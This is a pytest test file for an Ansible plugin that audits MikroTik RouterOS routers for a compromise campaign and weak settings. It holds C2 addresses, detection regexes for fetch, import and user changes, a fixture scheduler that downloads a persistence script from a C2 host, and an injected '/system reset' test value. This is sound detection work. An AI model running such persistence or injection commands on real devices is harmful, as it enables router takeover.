"""Unit tests for filter_plugins/routeros_security.py.

Run from the repository root with: python -m pytest mikrotik_security/tests/unit
"""

import base64
import copy
import importlib.util
import json
import os

import pytest

PLUGIN = os.path.join(os.path.dirname(__file__), '..', '..', 'filter_plugins', 'routeros_security.py')
spec = importlib.util.spec_from_file_location('routeros_security', PLUGIN)
rs = importlib.util.module_from_spec(spec)
spec.loader.exec_module(rs)

DEFAULTS = {
    'authorized_users': ['admin', 'ansible'],
    'authorized_ssh_key_users': ['ansible'],
    'authorized_ssh_key_owners': None,
    'authorized_ovpn_clients': [],
    'authorized_pptp_clients': [],
    'authorized_ppp_users': None,
    'expected_features': {'socks': False, 'romon': False, 'ovpn_server': False, 'pptp_server': False},
    'known_users': ['svcnet', 'cfgmarket', 'ops'],
    'known_ssh_key_owners': ['mtops'],
    'known_scheduler_names': ['netupd', 'cfg-res', 'cfg-v5', 'wan-check', 'health-check'],
    'known_script_names': ['cfg-rpt', 'persist-v2', 'wan-check', 'health-check'],
    'known_files': ['mt_setup.rsc', 'mt_pub.key'],
    'known_c2_addresses': ['64.44.141.220', '23.95.217.226', '82.192.72.4'],
    'suspicious_firewall_comments': ['cfgmarket-', 'ovpn-cfgmarket'],
    'known_name_fragments': ['cfgmarket'],
    'log_patterns': ['for user -2 from', 'ssh:-2@'],
    'trusted_script_names': [],
    'suspicious_script_patterns': {
        'fetch': r'tool[ /]+fetch',
        'import': r'(^|[\s;{/])import\b',
        'user_change': r'user[ /]+(add|set)\b',
        'ssh_keys': r'ssh-keys',
        'ssh': r'\bssh\b',
        'ip_service': r'ip[ /]+service',
    },
    'suspicious_min_matches': 2,
    'collect_logs': True,
    'collect_ppp_secrets': True,
}


def ok(*items):
    return {'status': 'ok', 'items': list(items)}


def clean_data():
    """A small, uncompromised RouterOS 7 device as the collectors return it."""
    return {
        'device_mode': ok({'mode': 'advanced', 'flagged': False, 'flagging-enabled': True}),
        'users': ok(
            {'.id': '*1', 'name': 'admin', 'group': 'full', 'address': [], 'disabled': False},
            {'.id': '*2', 'name': 'ansible', 'group': 'full', 'address': [], 'disabled': False},
        ),
        'user_groups': ok(
            {'name': 'read', 'policy': 'local,telnet,ssh,read,test,winbox,!write,!policy'},
            {'name': 'full', 'policy': 'local,telnet,ssh,read,write,policy,test,winbox'},
        ),
        'ssh_keys': ok({'user': 'ansible', 'key-type': 'ed25519', 'bits': 256, 'info': 'ansible-ci'}),
        'scripts': ok(
            {'name': 'backup', 'source': '/system backup save name=nightly'},
            {'name': 'ddns', 'source': '/tool fetch url="https://example.com/update" keep-result=no'},
        ),
        'schedulers': ok({'name': 'nightly', 'interval': '1d', 'on-event': '/system script run backup'}),
        'files': ok({'name': 'skins', 'type': 'directory'}, {'name': 'flash/backup.backup', 'type': 'backup'}),
        'netwatch': ok(),
        'ppp_profiles': ok({'name': 'default'}),
        'dhcp_clients': ok({'interface': 'ether1'}),
        'dhcp_servers': ok(),
        'ovpn_clients': ok(),
        'ovpn_server': ok({'enabled': False, 'port': 1194}),
        'pptp_clients': ok(),
        'pptp_server': ok({'enabled': False}),
        'ppp_secrets': ok({'name': 'customer1', 'service': 'pppoe', 'password': 'REDACTED'}),
        'firewall_filter': ok(
            {'chain': 'input', 'action': 'accept', 'connection-state': 'established,related,untracked', 'disabled': False},
            {'chain': 'input', 'action': 'drop', 'connection-state': 'invalid', 'disabled': False},
            {'chain': 'input', 'action': 'accept', 'protocol': 'icmp', 'disabled': False},
            {'chain': 'input', 'action': 'drop', 'in-interface-list': '!LAN', 'disabled': False, 'log': False},
        ),
        'firewall_nat': ok({'chain': 'srcnat', 'action': 'masquerade', 'out-interface-list': 'WAN'}),
        'firewall_mangle': ok(),
        'firewall_raw': ok(),
        'ipv6_firewall_filter': ok(),
        'ipv6_firewall_mangle': ok(),
        'logs': ok({'time': '2026-09-17 10:00:00', 'topics': 'system,info,account', 'message': 'user admin logged in from 10.0.0.5 via winbox'}),
        'history': ok({'action': 'script added', 'by': 'admin', 'trace': 'winbox:admin@10.0.0.5',
                       'redo': '/system script add name=backup', 'time': '2026-09-01 10:00:00'}),
        'services': ok(
            {'name': 'telnet', 'port': 23, 'disabled': True, 'address': []},
            {'name': 'ssh', 'port': 2937, 'disabled': False, 'address': ['64.90.67.144/29', '142.249.21.0/24']},
            {'name': 'winbox', 'port': 8291, 'disabled': False, 'address': '64.90.67.144/29'},
            {'name': 'api', 'port': 8728, 'disabled': True, 'address': []},
            {'name': 'btest', 'port': 2000, 'disabled': False, 'dynamic': True},
        ),
        'socks': ok({'enabled': False, 'port': 1080, 'version': 4.0}),
        'romon': ok({'enabled': False, 'id': '00:00:00:00:00:00', 'secrets': 'REDACTED'}),
        'mac_server': ok({'allowed-interface-list': 'LAN'}),
        'mac_winbox': ok({'allowed-interface-list': 'LAN'}),
        'bandwidth_server': ok({'enabled': False, 'authenticate': True}),
        'cloud': ok({'ddns-enabled': False}),
        'dns': ok({'allow-remote-requests': False, 'servers': []}),
    }


def by_id(findings):
    return dict((f['id'], f) for f in findings)


def mikrotrick(data, **overrides):
    settings = copy.deepcopy(DEFAULTS)
    settings.update(overrides)
    return by_id(rs.routeros_mikrotrick_findings(data, settings))


BASELINE = {
    'management_networks': ['64.90.67.144/29', '142.249.21.0/24'],
    'allowed_services': ['ssh', 'winbox'],
    'expected_features': {'socks': False, 'romon': False, 'bandwidth_server': False, 'cloud_ddns': False},
}


def baseline(data, **overrides):
    settings = dict(BASELINE, **overrides)
    return by_id(rs.routeros_baseline_findings(data, settings))


# ---------------------------------------------------------------- collection

def encode(item, chunk=64):
    """Render one item the way the RouterOS collector script prints it."""
    b64 = base64.b64encode(json.dumps(item).encode()).decode()
    lines = ['RSAB|'] + ['RSAJ:%s|' % b64[i:i + chunk] for i in range(0, len(b64), chunk)]
    return lines


def test_collector_command():
    cmd = rs.routeros_collector_command({'path': '/user'}, 32)
    assert ':parse ":return [/user print detail as-value]"' in cmd
    assert ':parse ":return [/user print as-value]"' in cmd
    assert ' get' not in cmd
    assert ':local c 32;' in cmd and ':if (true)' in cmd
    assert 'RSAB|' not in cmd and 'RSAJ:' not in cmd and 'RSAZ|' not in cmd and 'RSAX|' not in cmd
    assert '"password"' in cmd
    assert 'value=\\$1 to=json options=json.no-string-conversion' in cmd
    assert cmd.count('{') == cmd.count('}') and cmd.count('[') == cmd.count(']') and cmd.count('(') == cmd.count(')')


def test_collector_command_match_and_validation():
    cmd = rs.routeros_collector_command({'path': '/log', 'match': {'message': 'login failure|-2@', 'topics': 'critical'}})
    assert '([:tostr ($r->"message")] ~ "login failure|-2@") || ([:tostr ($r->"topics")] ~ "critical")' in cmd
    for bad in ({'path': '/user"; /system reset'}, {'path': '/log', 'match': {'message': '$x'}},
                {'path': '/user', 'match': {'name"': 'x'}}, {}):
        with pytest.raises(rs.AnsibleFilterError):
            rs.routeros_collector_command(bad)


def test_collector_decode_round_trip_with_echo_and_wrapping():
    users = [{'name': 'admin', 'group': 'full'}, {'name': 'svcnet', 'comment': 'x' * 200, 'password': 'hunter2'}]
    lines = ['[admin@MikroTik] > :local p "RSA"; ... :put ($p . "B|") ...']
    for user in users:
        lines += encode(user)
    lines.append('RSAZ|')
    text = '\r\n'.join(lines)
    # a terminal that wraps long lines inserts CR/LF inside a chunk
    text = text.replace('RSAJ:', 'RSA\r\nJ:', 1)
    result = rs.routeros_collector_decode(text)
    assert result['status'] == 'ok'
    assert [u['name'] for u in result['items']] == ['admin', 'svcnet']
    assert result['items'][1]['password'] == 'REDACTED'


def test_collector_decode_errors():
    assert rs.routeros_collector_decode('RSAX|\r\nRSAZ|')['status'] == 'error'
    assert rs.routeros_collector_decode('\n'.join(encode({'a': 1})))['status'] == 'error'  # no end marker
    assert rs.routeros_collector_decode('RSAB|\nRSAJ:bm90IGpzb24=|\nRSAZ|')['status'] == 'error'
    assert rs.routeros_collector_decode('RSAZ|') == {'status': 'ok', 'items': []}


def test_collected_data_from_loop_results():
    results = [
        {'collector_name': 'users', 'ansible_loop_var': 'collector_name',
         'stdout': ['\n'.join(encode({'name': 'admin'}) + ['RSAZ|'])]},
        {'collector_name': 'socks', 'ansible_loop_var': 'collector_name', 'failed': True, 'msg': 'bad command name'},
        {'collector_name': 'files', 'ansible_loop_var': 'collector_name', 'skipped': True},
    ]
    data = rs.routeros_collected_data(results)
    assert data['users']['items'] == [{'name': 'admin'}]
    assert data['socks'] == {'status': 'error', 'error': 'bad command name', 'items': []}
    assert 'files' not in data
    unsupported = rs.routeros_collectors_unsupported(['users'], 'requires RouterOS 7.13 or newer')
    assert unsupported['users']['status'] == 'unsupported'


# ------------------------------------------------------------------ versions

def test_text_tidies_serialized_numbers():
    assert rs._text(22.0) == '22'
    assert rs._text(4.5) == '4.5'
    assert rs._ports(22.0) == {22}
    assert rs._ports('21-23,8291') == {21, 22, 23, 8291}


@pytest.mark.parametrize('raw, expected', [
    ('7.24.2 (stable)', '7.24.2'),
    ('7.25beta3 (testing)', '7.25beta3'),
    ('6.49.21 (long-term)', '6.49.21'),
    ('7.16', '7.16'),
    ('garbage', ''),
])
def test_version_normalise(raw, expected):
    assert rs.routeros_version(raw) == expected


@pytest.mark.parametrize('left, op, right, expected', [
    ('7.25beta3', '<', '7.25rc1', True),
    ('7.25rc1', '<', '7.25', True),
    ('7.25', '<', '7.25.1', True),
    ('7.9', '<', '7.13', True),
    ('7.13', '>=', '7.13', True),
    ('6.49.21', '>=', '7.13', False),
    ('7.24.2 (stable)', '==', '7.24.2', True),
    ('unknown', '>=', '7.13', False),
])
def test_version_compare(left, op, right, expected):
    assert rs.routeros_version_compare(left, op, right) is expected


MIKROTRICK = {
    'id': 'mikrotrick', 'name': 'MikroTrick', 'severity': 'critical',
    'cves': ['CVE-2026-67276', 'CVE-2026-86060', 'CVE-2026-67277'],
    'context': ['ssh_service', 'bandwidth_server'],
    'fixed_in': [
        {'version': '6.49.21', 'channel': 'long-term'},
        {'version': '7.23.4', 'channel': 'long-term'},
        {'version': '7.24.2', 'channel': 'stable'},
        {'version': '7.25beta3', 'channel': 'testing'},
    ],
}
TLS_HOST = {
    'id': 'cve_2026_52346', 'name': 'tls-host firewall matching', 'severity': 'warning',
    'requires': 'firewall_tls_host',
    'fixed_in': [{'version': '7.21.4', 'channel': 'long-term'}, {'version': '7.22.2', 'channel': 'stable'}],
}


@pytest.mark.parametrize('version, status, upgrade', [
    ('7.24.1', 'vulnerable', ['7.24.2 (stable)']),
    ('7.24.2', 'fixed', []),
    ('7.23.3', 'vulnerable', ['7.23.4 (long-term)']),
    ('7.23.4', 'fixed', []),
    ('7.25beta2', 'vulnerable', ['7.25beta3 (testing)']),
    ('7.25rc1', 'fixed', []),
    ('7.25', 'fixed', []),
    ('7.26beta1', 'fixed', []),
    ('7.22.2', 'vulnerable', ['7.23.4 (long-term)', '7.24.2 (stable)', '7.25beta3 (testing)']),
    ('7.20beta7', 'vulnerable', ['7.23.4 (long-term)', '7.24.2 (stable)', '7.25beta3 (testing)']),
    ('6.49.20', 'vulnerable', ['6.49.21 (long-term)']),
    ('6.48.6', 'vulnerable', ['6.49.21 (long-term)']),
    ('', 'unknown', []),
])
def test_mikrotrick_release_trains(version, status, upgrade):
    assert rs.routeros_advisory_status(version, MIKROTRICK) == {'status': status, 'upgrade_to': upgrade}


@pytest.mark.parametrize('version, status', [
    ('7.21.3', 'vulnerable'),
    ('7.21.4', 'fixed'),
    ('7.22.1', 'vulnerable'),
    ('7.23.4', 'fixed'),
    ('6.49.21', 'unlisted'),
])
def test_tls_host_release_trains(version, status):
    assert rs.routeros_advisory_status(version, TLS_HOST)['status'] == status


def test_advisory_affected_from():
    advisory = dict(TLS_HOST, affected_from='7.10')
    assert rs.routeros_advisory_status('7.9', advisory)['status'] == 'not_affected'


def test_vulnerability_findings():
    data = clean_data()
    findings = by_id(rs.routeros_vulnerability_findings(data, '7.24.1', [MIKROTRICK, TLS_HOST]))
    mt = findings['vulnerabilities.mikrotrick']
    assert mt['result'] == 'CRITICAL'
    assert 'upgrade to 7.24.2 (stable)' in mt['message']
    assert 'SSH is enabled on port 2937, allowed from 64.90.67.144/29,142.249.21.0/24' in mt['evidence']
    assert 'bandwidth-test server is disabled' in mt['evidence']
    assert findings['vulnerabilities.cve_2026_52346']['result'] == 'PASS'

    findings = by_id(rs.routeros_vulnerability_findings(data, '7.22.1', [TLS_HOST]))
    assert findings['vulnerabilities.cve_2026_52346']['result'] == 'INFO'

    data['firewall_filter']['items'].append({'chain': 'forward', 'action': 'drop', 'tls-host': '*.example'})
    findings = by_id(rs.routeros_vulnerability_findings(data, '7.22.1', [TLS_HOST]))
    assert findings['vulnerabilities.cve_2026_52346']['result'] == 'WARNING'
    assert any('tls-host=*.example' in e for e in findings['vulnerabilities.cve_2026_52346']['evidence'])

    for name in rs._FIREWALL_COLLECTORS:
        data[name] = {'status': 'unsupported', 'error': 'old', 'items': []}
    findings = by_id(rs.routeros_vulnerability_findings(data, '7.22.1', [TLS_HOST]))
    assert findings['vulnerabilities.cve_2026_52346']['result'] == 'WARNING'
    assert 'could not check' in findings['vulnerabilities.cve_2026_52346']['message']

    findings = by_id(rs.routeros_vulnerability_findings({}, '6.49.21', [TLS_HOST, MIKROTRICK]))
    assert findings['vulnerabilities.cve_2026_52346']['result'] == 'UNKNOWN'
    assert findings['vulnerabilities.mikrotrick']['result'] == 'PASS'


# ---------------------------------------------------------------- MikroTrick

def test_clean_device_passes():
    findings = mikrotrick(clean_data())
    assert set(f['result'] for f in findings.values()) == {'PASS'}, [
        (f['id'], f['result'], f['message'], f['evidence']) for f in findings.values() if f['result'] != 'PASS']


def test_j2sw_compromise_is_critical():
    data = clean_data()
    data['users']['items'] += [
        {'name': 'svcnet', 'group': 'full', 'address': []},
        {'name': 'cfgmarket', 'group': 'read', 'address': []},
    ]
    data['ssh_keys']['items'].append({'user': 'svcnet', 'key-type': 'rsa', 'bits': 2048, 'info': 'mtops'})
    data['schedulers']['items'] += [
        {'name': 'cfg-v5', 'interval': '30m', 'on-event': '/tool fetch url=http://23.95.217.226:8080/persist_mt_v5.rsc'},
        {'name': 'renamed', 'interval': '30s', 'on-event': '/system script run persist-v2'},
    ]
    data['scripts']['items'].append({'name': 'maint', 'source': '/user set svcnet password=x\r\n/ip service set ssh disabled=no port=22'})
    data['files']['items'].append({'name': 'flash/mt_pub.key', 'size': 400})
    data['ovpn_clients']['items'].append({'name': 'mesh', 'connect-to': '64.44.141.220', 'port': 1195, 'user': 'cfgmarket'})
    data['ovpn_server'] = ok({'enabled': True, 'port': 1194})
    data['pptp_server'] = ok({'enabled': True})
    data['ppp_secrets']['items'].append({'name': 'cfgmarket', 'service': 'ovpn'})
    data['firewall_filter']['items'] += [
        {'chain': 'input', 'action': 'accept', 'src-address': '10.8.0.0/24', 'comment': 'cfgmarket-ovpn-fw-10.8.0.0_24'},
        {'chain': 'input', 'action': 'drop', 'src-address': '82.192.72.4', 'comment': 'block attacker'},
    ]
    data['logs']['items'].append({'time': '2026-09-02 01:00:00', 'topics': 'system,error,critical',
                                  'message': 'login failure for user -2 from 82.192.72.4 via ssh'})
    data['history']['items'] += [
        {'action': 'user added', 'by': 'admin', 'trace': 'ssh:-2@198.51.100.20', 'time': '2026-09-02 01:00:01',
         'redo': '/user add group=full name=svcnet password=RexPwn3d2026!'},
        {'action': 'item added', 'by': 'admin', 'trace': 'console:admin@ttyS0', 'time': '2026-09-02 01:00:02',
         'redo': '/interface ovpn-client add connect-to=64.44.141.220 name=mesh'},
    ]
    data['device_mode'] = ok({'mode': 'advanced', 'flagged': True, 'flagging-enabled': True})

    findings = mikrotrick(data)
    expected = {
        'mikrotrick.device_flagged': 'CRITICAL',
        'mikrotrick.known_users': 'CRITICAL',
        'mikrotrick.unauthorized_users': 'CRITICAL',
        'mikrotrick.ssh_keys': 'CRITICAL',
        'mikrotrick.schedulers': 'CRITICAL',
        'mikrotrick.scripts': 'WARNING',
        'mikrotrick.files': 'CRITICAL',
        'mikrotrick.c2_addresses': 'CRITICAL',
        'mikrotrick.firewall_comments': 'CRITICAL',
        'mikrotrick.ovpn_clients': 'CRITICAL',
        'mikrotrick.ovpn_server': 'WARNING',
        'mikrotrick.pptp_server': 'WARNING',
        'mikrotrick.ppp_secrets': 'CRITICAL',
        'mikrotrick.logs': 'CRITICAL',
        'mikrotrick.history': 'CRITICAL',
    }
    assert dict((k, findings[k]['result']) for k in expected) == expected

    keys = findings['mikrotrick.ssh_keys']['evidence']
    assert 'configured SSH key user: ansible owner: ansible-ci (key-type=ed25519 bits=256) PASS' in keys
    assert any(line.startswith('configured SSH key user: svcnet owner: mtops') and 'CRITICAL' in line for line in keys)

    schedulers = ' '.join(findings['mikrotrick.schedulers']['evidence'])
    assert 'scheduler cfg-v5' in schedulers and 'references known C2 address 23.95.217.226' in schedulers
    assert 'runs known MikroTrick script persist-v2' in schedulers

    scripts = findings['mikrotrick.scripts']['evidence']
    assert scripts == ['script maint: contains ip_service + ssh + user_change']

    unauthorized = findings['mikrotrick.unauthorized_users']['evidence']
    assert any(line.startswith('user svcnet') and 'can change configuration' in line for line in unauthorized)
    assert any(line.startswith('user cfgmarket') and 'can change configuration' not in line for line in unauthorized)

    history = findings['mikrotrick.history']['evidence']
    assert history == [
        '2026-09-02 01:00:01 user added by admin via ssh:-2@198.51.100.20 [known user svcnet, ssh:-2@]',
        '2026-09-02 01:00:02 item added by admin via console:admin@ttyS0 [C2 address 64.44.141.220]',
    ]
    assert 'RexPwn3d' not in json.dumps(findings)

    c2 = findings['mikrotrick.c2_addresses']['evidence']
    assert any('blocks 82.192.72.4' in line for line in c2)
    assert any('ovpn_clients mesh references 64.44.141.220' in line for line in c2)


def test_trusted_scripts_and_single_indicator():
    data = clean_data()
    data['scripts']['items'].append({'name': 'blocklist', 'source': '/tool fetch url=https://x/list.rsc\r\n/import file-name=list.rsc'})
    assert mikrotrick(data)['mikrotrick.scripts']['result'] == 'WARNING'
    assert mikrotrick(data, trusted_script_names=['blocklist'])['mikrotrick.scripts']['result'] == 'PASS'
    # trusted scripts are still searched for C2 addresses
    data['scripts']['items'][-1]['source'] += '\r\n/tool fetch url=http://64.44.141.220/x'
    assert mikrotrick(data, trusted_script_names=['blocklist'])['mikrotrick.scripts']['result'] == 'CRITICAL'


def test_ssh_key_owner_allowlist():
    data = clean_data()
    assert mikrotrick(data, authorized_ssh_key_owners=['someone'])['mikrotrick.ssh_keys']['result'] == 'WARNING'
    assert mikrotrick(data, authorized_ssh_key_owners=['ansible-ci'])['mikrotrick.ssh_keys']['result'] == 'PASS'
    data['ssh_keys'] = ok()
    assert mikrotrick(data)['mikrotrick.ssh_keys']['message'] == 'No SSH public keys are installed'


def test_vpn_and_ppp_allowlists():
    data = clean_data()
    data['ovpn_clients']['items'].append({'name': 'site-b', 'connect-to': '198.51.100.7', 'user': 'siteb'})
    data['pptp_clients']['items'].append({'name': 'legacy', 'connect-to': '198.51.100.8', 'user': 'x', 'disabled': True})
    findings = mikrotrick(data)
    assert findings['mikrotrick.ovpn_clients']['result'] == 'WARNING'
    assert findings['mikrotrick.pptp_clients']['result'] == 'WARNING'
    findings = mikrotrick(data, authorized_ovpn_clients=['site-b'], authorized_pptp_clients=['legacy'],
                          authorized_ppp_users=['someone'])
    assert findings['mikrotrick.ovpn_clients']['result'] == 'PASS'
    assert findings['mikrotrick.pptp_clients']['result'] == 'PASS'
    assert findings['mikrotrick.ppp_secrets']['result'] == 'WARNING'


def test_ovpn_server_list_format():
    data = clean_data()
    data['ovpn_server'] = ok({'name': 'ovpn-server1', 'disabled': False, 'port': 1194})
    assert mikrotrick(data)['mikrotrick.ovpn_server']['result'] == 'WARNING'
    assert mikrotrick(data, expected_features={'ovpn_server': True})['mikrotrick.ovpn_server']['result'] == 'PASS'
    data['ovpn_server'] = ok({'name': 'ovpn-server1', 'disabled': True, 'port': 1194})
    assert mikrotrick(data)['mikrotrick.ovpn_server']['result'] == 'PASS'
    data['ovpn_server'] = ok()
    assert mikrotrick(data)['mikrotrick.ovpn_server']['message'] == 'OpenVPN server is disabled'
    data['ovpn_server'] = {'status': 'error', 'error': 'x', 'items': []}
    assert mikrotrick(data)['mikrotrick.ovpn_server']['result'] == 'UNKNOWN'


def test_embedded_scripts():
    data = clean_data()
    data['netwatch'] = ok({'host': '192.0.2.9', 'up-script': '/tool fetch url=http://x/y.rsc; /import y.rsc'})
    finding = mikrotrick(data)['mikrotrick.script_hooks']
    assert finding['result'] == 'WARNING'
    assert finding['evidence'] == ['netwatch 192.0.2.9: contains fetch + import']
    data['dhcp_clients'] = {'status': 'error', 'error': 'boom', 'items': []}
    assert mikrotrick(data)['mikrotrick.script_hooks']['result'] == 'WARNING'
    data['netwatch'] = ok()
    assert mikrotrick(data)['mikrotrick.script_hooks']['result'] == 'UNKNOWN'


def test_missing_collectors_are_unknown_not_pass():
    findings = mikrotrick({})
    assert findings['mikrotrick.known_users']['result'] == 'UNKNOWN'
    assert 'users: not collected' in findings['mikrotrick.known_users']['message']
    assert findings['mikrotrick.c2_addresses']['result'] == 'UNKNOWN'
    assert findings['mikrotrick.script_hooks']['result'] == 'UNKNOWN'
    assert mikrotrick({}, collect_logs=False)['mikrotrick.logs']['result'] == 'INFO'


def test_device_mode_without_flagged_property():
    data = clean_data()
    data['device_mode'] = ok({'mode': 'enterprise'})
    assert mikrotrick(data)['mikrotrick.device_flagged']['result'] == 'INFO'


# ------------------------------------------------------------------ baseline

def test_baseline_clean_device():
    findings = baseline(clean_data())
    assert 'baseline.service.btest' not in findings
    assert set(f['result'] for f in findings.values()) == {'PASS'}, [
        (f['id'], f['message'], f['evidence']) for f in findings.values() if f['result'] != 'PASS']
    assert findings['baseline.service.ssh']['evidence'] == [
        'enabled: yes', 'port: 2937', 'allowed-addresses: 64.90.67.144/29,142.249.21.0/24']
    assert [f for f in findings if f.startswith('baseline.service.')] == [
        'baseline.service.telnet', 'baseline.service.ssh', 'baseline.service.api', 'baseline.service.winbox']


def test_baseline_exposed_services():
    data = clean_data()
    data['services'] = ok(
        {'name': 'ssh', 'port': 22, 'disabled': False, 'address': ['0.0.0.0/0']},
        {'name': 'winbox', 'port': 8291, 'disabled': False, 'address': ['10.0.0.0/8']},
        {'name': 'telnet', 'port': 23, 'disabled': False, 'address': []},
        {'name': 'reverse-proxy', 'port': 443, 'disabled': False, 'address': ['64.90.67.144/29']},
    )
    findings = baseline(data)
    assert findings['baseline.service.ssh']['result'] == 'WARNING'
    assert 'allowed from 0.0.0.0/0' in findings['baseline.service.ssh']['message']
    assert findings['baseline.service.ssh']['evidence'] == ['enabled: yes', 'port: 22', 'allowed-addresses: 0.0.0.0/0']
    assert 'outside routeros_management_networks' in findings['baseline.service.winbox']['message']
    telnet = findings['baseline.service.telnet']['message']
    assert 'not in routeros_allowed_services' in telnet and 'cleartext' in telnet and 'no address restriction' in telnet
    assert 'not in routeros_allowed_services' in findings['baseline.service.reverse-proxy']['message']
    # without management networks only a missing or 0.0.0.0/0 restriction is flagged
    assert baseline(data, management_networks=[])['baseline.service.winbox']['result'] == 'PASS'


def test_baseline_features():
    data = clean_data()
    data['socks'] = ok({'enabled': True, 'port': 1080})
    data['romon'] = ok({'enabled': True, 'secrets': 'REDACTED'})
    data['bandwidth_server'] = ok({'enabled': True, 'authenticate': True})
    data['cloud'] = ok({'ddns-enabled': True, 'dns-name': 'abc.sn.mynetname.net'})
    data['mac_winbox'] = ok({'allowed-interface-list': 'all'})
    data['dns'] = ok({'allow-remote-requests': True})
    data['device_mode'] = ok({'mode': 'advanced', 'flagging-enabled': False})
    findings = baseline(data)
    for fid in ('socks', 'romon', 'bandwidth_server', 'cloud_ddns', 'mac_access', 'device_mode'):
        assert findings['baseline.' + fid]['result'] == 'WARNING', fid
    assert 'REDACTED' not in ' '.join(findings['baseline.romon']['evidence'])
    assert 'CVE-2026-67277' in findings['baseline.bandwidth_server']['message']
    assert findings['baseline.dns_remote_requests']['result'] == 'INFO'
    expected = dict(BASELINE['expected_features'], socks=True)
    assert baseline(data, expected_features=expected)['baseline.socks']['result'] == 'PASS'


def test_baseline_firewall_input():
    data = clean_data()
    data['firewall_filter']['items'].insert(0, {'chain': 'input', 'action': 'accept', 'protocol': 'tcp', 'dst-port': '22,8291'})
    finding = baseline(data)['baseline.firewall_input']
    assert finding['result'] == 'WARNING'
    assert finding['evidence'] == ['accepts management ports from any source: protocol=tcp dst-port=22,8291']

    data = clean_data()
    data['firewall_filter'] = ok({'chain': 'input', 'action': 'accept', 'src-address-list': 'mgmt'})
    finding = baseline(data)['baseline.firewall_input']
    assert finding['evidence'] == ['no drop rule catches the remaining input traffic']

    data['firewall_filter'] = ok({'chain': 'forward', 'action': 'drop'})
    assert 'no rules' in baseline(data)['baseline.firewall_input']['message']


# ----------------------------------------------------------------- reporting

def test_assert_finding():
    passed = {'failed': False, 'msg': 'Congratulations'}
    failed = {'failed': True, 'msg': 'DANGER', 'assertion': 'x', 'evaluated_to': False}
    errored = {'failed': True, 'msg': 'The conditional check failed'}
    assert rs.routeros_assert_finding(errored, 'meris', 'file', 'Files')['result'] == 'UNKNOWN'
    assert rs.routeros_assert_finding(passed, 'meris', 'file', 'Files')['result'] == 'PASS'
    finding = rs.routeros_assert_finding(failed, 'unauth_users', 'users', 'Users', 'CRITICAL', ['bob'])
    assert (finding['id'], finding['result'], finding['evidence']) == ('unauth_users.users', 'CRITICAL', ['bob'])
    assert rs.routeros_assert_finding({'skipped': True}, 'meris', 'x', 'X')['result'] == 'UNKNOWN'


def test_suppress_sort_threshold_summary():
    findings = [
        {'id': 'baseline.service.ssh', 'result': 'WARNING', 'message': 'a'},
        {'id': 'mikrotrick.files', 'result': 'CRITICAL', 'message': 'b'},
        {'id': 'baseline.dns_remote_requests', 'result': 'PASS', 'message': 'c'},
        {'id': 'mikrotrick.logs', 'result': 'UNKNOWN', 'message': 'd'},
    ]
    suppressed = rs.routeros_findings_suppress(findings, ['baseline.service.*', 'mikrotrick.logs'])
    assert [f['result'] for f in suppressed] == ['INFO', 'CRITICAL', 'PASS', 'INFO']
    assert suppressed[0]['message'] == 'a (suppressed WARNING)'
    assert findings[0]['result'] == 'WARNING'  # input is not modified
    assert [f['id'] for f in rs.routeros_findings_sort(findings)] == [
        'mikrotrick.files', 'baseline.service.ssh', 'mikrotrick.logs', 'baseline.dns_remote_requests']
    assert [f['id'] for f in rs.routeros_findings_at_least(findings, 'warning')] == ['baseline.service.ssh', 'mikrotrick.files']
    assert rs.routeros_findings_at_least(findings, 'none') == []
    summary = rs.routeros_findings_summary(findings)
    assert summary['result'] == 'CRITICAL' and summary['counts']['WARNING'] == 1
    with pytest.raises(rs.AnsibleFilterError):
        rs.routeros_findings_at_least(findings, 'bogus')


def test_csv_row_quotes_and_keeps_empty_cells():
    assert rs.routeros_csv_row(['lab-rtr', 'ssh', 'WARNING']) == '"lab-rtr","ssh","WARNING"'
    # commas, quotes and newlines inside a finding must not break the columns
    row = rs.routeros_csv_row(['a,b', 'say "hi"', 'line1\nline2'])
    assert row == '"a,b","say ""hi""","line1\nline2"'
    # empty and None cells are kept so columns stay aligned
    assert rs.routeros_csv_row(['x', '', None, 'y']) == '"x","","","y"'
    assert rs.routeros_csv_row([True, False, 3, ['a', 'b']]) == '"yes","no","3","a,b"'
    assert rs.routeros_csv_row([]) == ''
    with pytest.raises(rs.AnsibleFilterError):
        rs.routeros_csv_row('not-a-list')
